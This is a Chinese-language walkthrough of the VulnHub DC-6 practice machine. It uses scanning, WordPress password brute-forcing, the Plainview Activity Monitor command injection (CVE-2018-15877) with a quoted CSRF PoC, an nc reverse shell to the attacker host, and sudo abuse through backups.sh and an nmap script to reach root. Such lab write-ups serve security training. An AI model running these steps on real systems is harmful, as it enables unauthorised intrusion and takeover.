# DC-6

主机发现

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.23.129
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.23.1    00:50:56:c0:00:08       VMware, Inc.
192.168.23.2    00:50:56:ec:db:1b       VMware, Inc.
192.168.23.147  00:0c:29:33:c8:07       VMware, Inc.
192.168.23.149  00:0c:29:6f:12:b0       VMware, Inc.
192.168.23.254  00:50:56:fe:0c:5a       VMware, Inc.
```

### 端口扫描

```
┌──(root㉿kali)-[~]
└─# nmap -sS -sV -p- -T4 192.168.23.149
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 21:05 EDT
Nmap scan report for 192.168.23.149
Host is up (0.00085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
MAC Address: 00:0C:29:6F:12:B0 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
```

可以看到目标开放了22和80端口，我们先访问一下80端口，这里需要将IP地址和域名加入到/etc/hosts当中

```
┌──(root㉿kali)-[~]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
192.168.43.48   kioptrix3.com
10.10.11.219    pilgrimage.htb
192.168.23.149  wordy
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

看页面没有发现什么有用的信息，我们扫描一下目标的目录

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://wordy/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://wordy/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/15 22:31:19 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 303] [--> http://wordy/wp-content/]
/wp-includes          (Status: 301) [Size: 304] [--> http://wordy/wp-includes/]
/wp-admin             (Status: 301) [Size: 301] [--> http://wordy/wp-admin/]
/server-status        (Status: 403) [Size: 293]
Progress: 220226 / 220561 (99.85%)
===============================================================
2023/08/15 22:32:20 Finished
===============================================================

```

可以看到目标路径，这个是wordpress的一个网站，我们用wpsscan扫描一下

```
┌──(root㉿kali)-[~]
└─# wpscan --url http://wordy/ --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordy/ [192.168.23.149]
[+] Started: Tue Aug 15 21:34:21 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug 15 21:34:23 2023
[+] Requests Done: 62
[+] Cached Requests: 6
[+] Data Sent: 15.646 KB
[+] Data Received: 641.26 KB
[+] Memory used: 178.637 MB
[+] Elapsed time: 00:00:02
```

可以看到有几个用户名，将它们保存到user.txt，然后准备个密码字典

```
┌──(root㉿kali)-[/usr/share/wordlists]
└─# cat rockyou.txt | grep k01 > /root/Desktop/vulnhub/DC-6/passwords.txt 
```

爆破一下它的密码

```
┌──(root㉿kali)-[~/Desktop/vulnhub/DC-6]
└─# wpscan --url http://wordy -U user.txt -P passwords.txt -t 50                   
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] Performing password attack on Xmlrpc against 5 user/s
[SUCCESS] - mark / helpdesk01                                                                                       
Trying jens / !lak019b Time: 00:05:48 <===============================       > (12552 / 15220) 82.47%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mark, Password: helpdesk01

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug 15 23:22:37 2023
[+] Requests Done: 12725
[+] Cached Requests: 5
[+] Data Sent: 6.225 MB
[+] Data Received: 7.742 MB
[+] Memory used: 265.383 MB
[+] Elapsed time: 00:05:56
```

可以看到爆破出一个用户名的密码，接下来我们用这个用户名登陆一下

<figure><img src="../../.gitbook/assets/image (71) (1).png" alt=""><figcaption></figcaption></figure>

成功登录，让我们看看有什么可以利用的

<figure><img src="../../.gitbook/assets/image (72) (1).png" alt=""><figcaption></figcaption></figure>

Activity monitor这个插件我们去搜一下

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

有一个命令执行的exploit，我们在kali里面searchsploit一下

```
┌──(root㉿kali)-[~/Desktop/vulnhub/DC-6]
└─# searchsploit Activity Monitor
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Activity Monitor 2002 2.6 - Remote Denial of Service                              | windows/dos/22690.c
RedHat Linux 6.0/6.1/6.2 - 'pam_console' Monitor Activity After Logout            | linux/local/19900.c
WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command In | php/webapps/45274.html
WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE | php/webapps/50110.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

有一个命令执行的exploit，将它保存到当前目录

```
┌──(root㉿kali)-[~/Desktop/vulnhub/DC-6]
└─# searchsploit -m php/webapps/45274.html
  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection
      URL: https://www.exploit-db.com/exploits/45274
     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html
    Codes: CVE-2018-15877
 Verified: True
File Type: HTML document, ASCII text
Copied to: /root/Desktop/vulnhub/DC-6/45274.html
```

我们先看一下poc

```
PoC:
-->

<html>
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html> 
```

关于这个漏洞的描述：Plainview Activity Monitor Wordpress 插件易受操作系统攻击 命令注入允许攻击者远程执行 底层系统上的命令。 应用程序通过了不安全的用户提供的 数据到ip参数进入activities\_overview.php。 需要权限才能利用此漏洞，但是 该插件版本也容易受到 CSRF 攻击和 Reflected XSS。 这三个漏洞结合起来可能会导致远程命令 只需管理员点击恶意链接即可执行。

所以我们要先访问So we visit wordy/wp-admin/admin.php？page=plainview\_activity\_monitor\&tab=activity\_tools这个页面

<figure><img src="../../.gitbook/assets/image (69) (1).png" alt=""><figcaption></figcaption></figure>

打开Burp Suite，然后单击网页上的Lookup。 现在我们可以修改POST请求：

<figure><img src="../../.gitbook/assets/image (70) (1).png" alt=""><figcaption></figcaption></figure>

我这里执行了一个cat /etc/passwd命令，没问题，接下来反弹shell，将要执行的命令改成下面这个

```
nc 192.168.23.129 8889 -e /bin/bash
```

nc监听到了

```
┌──(root㉿kali)-[~]
└─# nc -lnvp 8889
listening on [any] 8889 ...
connect to [192.168.23.129] from (UNKNOWN) [192.168.23.149] 35656
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

我们获取到了一个shell，用python获取一个bash shell

```
python -c "import pty;pty.spawn('/bin/bash')"
www-data@dc-6:/var/www/html/wp-admin$
```

在查看/home/mark/stuff目录下有个txt文件中发现存在 graham用户名和密码

```
www-data@dc-6:/home$ cd mark
cd mark
www-data@dc-6:/home/mark$ ls
ls
stuff
www-data@dc-6:/home/mark$ cd stuff
cd stuff
www-data@dc-6:/home/mark/stuff$ ls
ls
things-to-do.txt
www-data@dc-6:/home/mark/stuff$ cat tdhints-to-do.txt
cat tdhints-to-do.txt
cat: tdhints-to-do.txt: No such file or directory
www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt
cat things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

我们查看一下/etc/passwd是否存在这个用户

<pre><code>www-data@dc-6:/home/mark/stuff$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
<strong>graham:x:1001:1001:Graham,,,:/home/graham:/bin/bash
</strong>mark:x:1002:1002:Mark,,,:/home/mark:/bin/bash
sarah:x:1003:1003:Sarah,,,:/home/sarah:/bin/bash
jens:x:1004:1004:Jens,,,:/home/jens:/bin/bash
</code></pre>

倒数第四行就是这个用户，我们ssh去连接一下

```
┌──(root㉿kali)-[~]
└─# ssh graham@192.168.23.149                                      
The authenticity of host '192.168.23.149 (192.168.23.149)' can't be established.
ED25519 key fingerprint is SHA256:BiP2AT/3IPc02K9uqH+WQ7eaE/xcImEo/D1R6/0tjBw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.23.149' (ED25519) to the list of known hosts.
graham@192.168.23.149's password: 
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
graham@dc-6:~$
```

ok,下一步权限提升

### 权限提升

让我们看看有什么可以利用的点

```
graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

所以我们可以 sudo 来运行 jens 的 backups.sh。 此外，我们注意到开发组中的用户（例如 graham）可以修改 jens/backups.sh。

也就是说，我们可以获得一个名为 jens 的 shell：

```
graham@dc-6:/home/jens$ sudo -u jens ./backups.sh
tar: Removing leading `/' from member names
graham@dc-6:/home/jens$ cat backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:/home/jens$ echo "/bin/bash" > backups.sh
graham@dc-6:/home/jens$ sudo -u jens ./backups.sh
jens@dc-6:~$
```

限制我们拥有一个jens用户的shell，看一下可以做什么

```
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:                                                                         
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin          

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

我们可以以root身份运行nmap

```
jens@dc-6:~$ ls -al /usr/bin/nmap
-rwxr-xr-x 1 root root 2838168 Dec 22  2016 /usr/bin/nmap
```

我们无法修改这个文件。 但是我们可以编写一个 NSE 脚本并使用 nmap 执行它：

```
jens@dc-6:~$ TF=$(mktemp)
jens@dc-6:~$ echo 'os.execute("/bin/bash")' > $TF
jens@dc-6:~$ sudo nmap --script=$TF

Starting Nmap 7.40 ( https://nmap.org ) at 2023-08-17 11:45 AEST
NSE: Warning: Loading '/tmp/tmp.ZaLlxZidDE' -- the recommended file extension is '.nse'.
root@dc-6:/home/jens#
```

可以看到权限获得了root权限
